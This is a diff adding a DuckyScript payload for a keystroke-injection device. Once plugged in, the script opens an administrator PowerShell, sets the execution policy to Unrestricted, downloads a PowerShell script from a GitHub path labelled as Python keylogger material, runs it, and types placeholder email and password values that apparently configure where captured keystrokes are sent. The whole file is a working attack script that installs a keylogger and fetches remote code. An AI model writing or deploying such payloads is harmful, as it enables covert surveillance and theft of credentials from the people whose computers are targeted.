@@ -1,0 +1,28 @@
+REM --> Brings up quick access menu 
+WINDOWS x
+REM --> Brings up powershell admin
+STRING a
+DELAY 900
+LEFTARROW
+ENTER
+DELAY 900
+REM --> make window small
+ENTER
+REM --> Allows powershell scripts to be run, is set back to restricted in ps1 file after
+STRING Set-ExecutionPolicy -scope CurrentUser Unrestricted
+ENTER
+DELAY 500
+STRING Y
+ENTER
+REM --> Downloads ps1 file
+STRING wget "https://raw.githubusercontent.com/csandoval63/OMGCableStuff/master/Python%20keylogger%20stuff%20with%20DUCKYscript/install_python.ps1" -outfile "install_python.ps1"
+ENTER
+REM --> runs ps1 file
+DELAY 54000
+STRING ./install_python.ps1 "parameter title"
+ENTER
+DELAY 54000
+STRING emailhere
+DELAY 2000
+STRING passwordhere
+ENTER
